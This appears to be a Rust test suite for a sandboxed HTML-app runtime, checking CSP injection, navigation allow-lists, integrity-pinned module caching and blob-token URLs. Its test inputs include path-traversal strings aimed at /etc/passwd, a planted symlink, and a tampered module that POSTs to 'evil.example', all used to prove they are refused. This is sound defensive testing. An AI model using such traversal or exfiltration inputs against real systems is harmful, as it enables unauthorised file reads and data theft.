//! The `htmlapp://app/` origin, the injected CSP, and import pinning (PRD §8.4, §8.5, §11.2).

use std::collections::BTreeMap;

use htmlapp_caps::{Document, ImportSpec, Manifest};
use htmlapp_engine::imports::{ImportError, ModuleFetcher};
use htmlapp_engine::origin::{
    Response, allows_navigation, default_csp, prepare_document,
};
use htmlapp_engine::{ModuleCache, OriginResolver};

fn manifest(json: &str) -> Manifest {
    Manifest::from_json(json).expect("test manifest must parse")
}

// --- §8.4: what the origin serves ---

#[test]
fn index_is_served_at_root_and_index_html() {
    let resolver = OriginResolver::new("<h1>hi</h1>".into(), None, None);
    for path in ["/", "/index.html", "/index.html?x=1", "/#anchor"] {
        match resolver.resolve(path) {
            Response::Ok { body, content_type } => {
                assert_eq!(body, b"<h1>hi</h1>");
                assert!(content_type.starts_with("text/html"));
            }
            other => panic!("{path} should serve the document, got {other:?}"),
        }
    }
}

/// §8.4: "the default is strictly single-file".
#[test]
fn siblings_are_not_served_without_the_opt_in() {
    let temp = tempfile::tempdir().unwrap();
    std::fs::write(temp.path().join("secret.txt"), b"nope").unwrap();

    let resolver = OriginResolver::new("<h1>hi</h1>".into(), None, None);
    assert_eq!(resolver.resolve("/secret.txt"), Response::Forbidden);
}

#[test]
fn siblings_are_served_with_the_opt_in() {
    let temp = tempfile::tempdir().unwrap();
    std::fs::write(temp.path().join("style.css"), b"body{}").unwrap();

    let resolver = OriginResolver::new("<h1>hi</h1>".into(), Some(temp.path().into()), None);
    match resolver.resolve("/style.css") {
        Response::Ok { body, content_type } => {
            assert_eq!(body, b"body{}");
            assert!(content_type.starts_with("text/css"));
        }
        other => panic!("expected the stylesheet, got {other:?}"),
    }
}

/// Traversal out of the asset root must be refused even with the opt-in.
#[test]
fn asset_root_cannot_be_escaped() {
    let temp = tempfile::tempdir().unwrap();
    let app = temp.path().join("app");
    std::fs::create_dir_all(&app).unwrap();
    std::fs::write(temp.path().join("outside.txt"), b"secret").unwrap();
    std::fs::write(app.join("in.txt"), b"fine").unwrap();

    let resolver = OriginResolver::new(String::new(), Some(app.clone()), None);
    assert!(matches!(resolver.resolve("/in.txt"), Response::Ok { .. }));

    for escape in ["/../outside.txt", "/%2e%2e/outside.txt", "/a/../../outside.txt"] {
        assert!(
            matches!(resolver.resolve(escape), Response::Forbidden | Response::NotFound),
            "{escape} escaped the asset root"
        );
    }

    // A symlink planted beside the document must not work either.
    std::os::unix::fs::symlink(temp.path().join("outside.txt"), app.join("link.txt")).unwrap();
    assert_eq!(resolver.resolve("/link.txt"), Response::Forbidden);
}

// --- §11.2 rule 8: CSP ---

/// The control that actually matters: `connect-src` is pinned to the manifest's allow-list.
#[test]
fn csp_connect_src_follows_the_manifest() {
    let permissive = manifest(r#"{"permissions":{"net":{"fetch":["https://api.example.com/*"]}}}"#);
    let csp = default_csp(&permissive);
    assert!(csp.contains("connect-src"));
    assert!(csp.contains("https://api.example.com"), "granted origin missing: {csp}");
    assert!(!csp.contains("connect-src *"), "wildcard connect-src: {csp}");

    // A document that was granted no network gets no network.
    let bare = manifest("{}");
    let bare_csp = default_csp(&bare);
    assert!(!bare_csp.contains("example.com"));
    assert!(bare_csp.contains("frame-ancestors 'none'"));
    assert!(bare_csp.contains("object-src 'none'"));
    assert!(bare_csp.contains("base-uri 'none'"));
}

#[test]
fn csp_is_injected_into_head() {
    let document = Document::from_bytes(
        b"<!DOCTYPE html><html><head><title>T</title></head><body>x</body></html>",
    )
    .unwrap();
    let prepared = prepare_document(&document, &[]);

    assert!(prepared.contains("Content-Security-Policy"));
    let meta = prepared.find("Content-Security-Policy").unwrap();
    let title = prepared.find("<title>").unwrap();
    assert!(meta < title, "the CSP meta must precede the rest of the head");
}

/// A document with no `<head>` still gets a CSP.
#[test]
fn csp_is_injected_even_without_a_head() {
    for html in [
        &b"<html><body>x</body></html>"[..],
        &b"<body>just a body</body>"[..],
        &b"plain text"[..],
    ] {
        let document = Document::from_bytes(html).unwrap();
        let prepared = prepare_document(&document, &[]);
        assert!(
            prepared.contains("Content-Security-Policy"),
            "no CSP for {:?}",
            String::from_utf8_lossy(html)
        );
    }
}

/// §11.2 rule 8 allows an override, but it must be a deliberate act recorded in the document.
#[test]
fn manifest_can_override_the_csp() {
    let document = Document::from_bytes(
        br#"<html><head><script type="application/htmlapp+json">
            {"csp":"default-src 'none'"}
            </script></head><body></body></html>"#,
    )
    .unwrap();
    let prepared = prepare_document(&document, &[]);
    assert!(prepared.contains("default-src &#x27;none&#x27;") || prepared.contains("default-src 'none'"));
}

// --- §4.2 N2: not a browser ---

#[test]
fn navigation_is_confined_to_the_documents_own_origin() {
    let bare = manifest("{}");
    assert!(allows_navigation("htmlapp://app/index.html", &bare));
    assert!(!allows_navigation("https://evil.example/", &bare));
    assert!(!allows_navigation("file:///etc/passwd", &bare));

    let granted = manifest(r#"{"permissions":{"net":{"fetch":["https://ok.example/*"]}}}"#);
    assert!(allows_navigation("https://ok.example/page", &granted));
    assert!(!allows_navigation("https://evil.example/", &granted));
    // Scheme must match too — an allow-list of https must not authorise http.
    assert!(!allows_navigation("http://ok.example/page", &granted));
}

#[test]
fn wildcard_subdomains_do_not_match_the_apex_or_a_suffix_lookalike() {
    let granted = manifest(r#"{"permissions":{"net":{"fetch":["https://*.example.com/*"]}}}"#);
    assert!(allows_navigation("https://api.example.com/x", &granted));
    assert!(!allows_navigation("https://example.com/x", &granted));
    // Suffix confusion: these end with the granted characters but are different domains.
    assert!(!allows_navigation("https://notexample.com/x", &granted));
    assert!(!allows_navigation("https://evilexample.com/x", &granted));
    assert!(allows_navigation("https://deep.api.example.com/x", &granted));
}

// --- §8.5: import maps ---

struct StubFetcher(Vec<u8>);

impl ModuleFetcher for StubFetcher {
    fn fetch(&self, _url: &str) -> Result<Vec<u8>, ImportError> {
        Ok(self.0.clone())
    }
}

/// Never-fetched: proves the cache is actually consulted.
struct ExplodingFetcher;

impl ModuleFetcher for ExplodingFetcher {
    fn fetch(&self, url: &str) -> Result<Vec<u8>, ImportError> {
        panic!("must not hit the network for a cached module: {url}");
    }
}

fn imports_of(integrity: &str) -> BTreeMap<String, ImportSpec> {
    let mut imports = BTreeMap::new();
    imports.insert(
        "d3".to_string(),
        ImportSpec {
            url: "https://esm.sh/d3@7".into(),
            integrity: integrity.into(),
        },
    );
    imports
}

/// sha384 of `export const x = 1;`, computed independently below.
fn body_and_hash() -> (Vec<u8>, String) {
    use base64::Engine as _;
    use sha2::{Digest, Sha384};
    let body = b"export const x = 1;".to_vec();
    let hash = format!(
        "sha384-{}",
        base64::engine::general_purpose::STANDARD.encode(Sha384::digest(&body))
    );
    (body, hash)
}

#[test]
fn module_is_fetched_verified_then_served_from_cache() {
    let temp = tempfile::tempdir().unwrap();
    let cache = ModuleCache::new(temp.path());
    let (body, hash) = body_and_hash();

    let resolved = cache
        .resolve_all(&imports_of(&hash), &StubFetcher(body.clone()))
        .expect("a correctly pinned module must resolve");
    assert_eq!(resolved.len(), 1);
    assert_eq!(resolved[0].0, "d3");
    assert!(resolved[0].1.starts_with("/__modules__/"));
    assert!(cache.is_cached(&hash));

    // §8.5: "then serves them from cache offline forever after".
    cache
        .resolve_all(&imports_of(&hash), &ExplodingFetcher)
        .expect("second run must not touch the network");

    // And it is reachable over the origin.
    let resolver = OriginResolver::new(String::new(), None, Some(temp.path().into()));
    match resolver.resolve(&resolved[0].1) {
        Response::Ok { body: served, content_type } => {
            assert_eq!(served, body);
            assert!(content_type.starts_with("text/javascript"));
        }
        other => panic!("cached module not served: {other:?}"),
    }
}

/// §11.3: "Supply chain via `imports` — Integrity hashes required."
#[test]
fn module_whose_body_does_not_match_its_pin_is_rejected() {
    let temp = tempfile::tempdir().unwrap();
    let cache = ModuleCache::new(temp.path());
    let (_, hash) = body_and_hash();

    let tampered = b"export const x = 1; fetch('https://evil.example', {method:'POST'});".to_vec();
    let error = cache
        .resolve_all(&imports_of(&hash), &StubFetcher(tampered))
        .expect_err("a body that does not match its pin must be refused");

    assert!(matches!(error, ImportError::IntegrityMismatch { .. }), "got {error:?}");
    assert!(!cache.is_cached(&hash), "a rejected module must not be cached");
}

#[test]
fn unsupported_integrity_algorithm_is_refused() {
    let temp = tempfile::tempdir().unwrap();
    let cache = ModuleCache::new(temp.path());
    let error = cache
        .resolve_all(&imports_of("md5-abc"), &StubFetcher(b"x".to_vec()))
        .expect_err("md5 must not be accepted");
    assert!(matches!(error, ImportError::UnsupportedIntegrity(_)));
}

#[test]
fn import_map_is_injected_so_the_page_never_fetches_remotely() {
    let document = Document::from_bytes(b"<html><head></head><body></body></html>").unwrap();
    let prepared = prepare_document(
        &document,
        &[("d3".to_string(), "/__modules__/abc.js".to_string())],
    );
    assert!(prepared.contains(r#"<script type="importmap">"#));
    assert!(prepared.contains("/__modules__/abc.js"));
    // The specifier resolves to this origin, so `connect-src` never needs to allow esm.sh.
    assert!(!prepared.contains("esm.sh"));
}

#[test]
fn cache_purge_empties_it() {
    let temp = tempfile::tempdir().unwrap();
    let cache = ModuleCache::new(temp.path());
    let (body, hash) = body_and_hash();
    cache.resolve_all(&imports_of(&hash), &StubFetcher(body)).unwrap();

    assert!(cache.size() > 0);
    assert_eq!(cache.purge().unwrap(), 1);
    assert!(!cache.is_cached(&hash));
}

// --- §9.1: blob URLs, so bulk bytes never pass through JSON ---

#[test]
fn blob_tokens_are_served_and_scoped_to_the_token() {
    let temp = tempfile::tempdir().unwrap();
    let file = temp.path().join("big.bin");
    std::fs::write(&file, b"a lot of bytes").unwrap();

    let blobs = htmlapp_bridge::BlobStore::new();
    blobs.insert("abc123", &file);

    let resolver =
        OriginResolver::with_blobs(String::new(), None, None, blobs.clone());

    match resolver.resolve("/__blob__/abc123") {
        Response::Ok { body, .. } => assert_eq!(body, b"a lot of bytes"),
        other => panic!("blob should have been served: {other:?}"),
    }

    // An unminted token is not a way to read anything.
    assert_eq!(resolver.resolve("/__blob__/unknown"), Response::NotFound);

    // Revoking the token revokes the URL.
    blobs.remove("abc123");
    assert_eq!(resolver.resolve("/__blob__/abc123"), Response::NotFound);
}

/// The token is the capability, so it must not be usable to address anything else.
#[test]
fn blob_paths_cannot_be_traversed() {
    let temp = tempfile::tempdir().unwrap();
    let file = temp.path().join("ok.txt");
    std::fs::write(&file, b"ok").unwrap();

    let blobs = htmlapp_bridge::BlobStore::new();
    blobs.insert("abc123", &file);
    let resolver = OriginResolver::with_blobs(String::new(), None, None, blobs);

    for hostile in [
        "/__blob__/../../etc/passwd",
        "/__blob__/abc123/../../etc/passwd",
        "/__blob__/",
        "/__blob__/abc-123",
    ] {
        assert!(
            !matches!(resolver.resolve(hostile), Response::Ok { .. }),
            "{hostile} should not have resolved to a blob"
        );
    }
}

#[test]
fn blob_token_parsing_accepts_only_plain_tokens() {
    use htmlapp_bridge::BlobStore;
    assert_eq!(BlobStore::token_from_path("/__blob__/abc123"), Some("abc123"));
    assert_eq!(BlobStore::token_from_path("/__blob__/a/b"), None);
    assert_eq!(BlobStore::token_from_path("/__blob__/"), None);
    assert_eq!(BlobStore::token_from_path("/__blob__/a.b"), None);
    assert_eq!(BlobStore::token_from_path("/index.html"), None);
    assert!(BlobStore::url_for("abc").starts_with("htmlapp://app/__blob__/"));
}
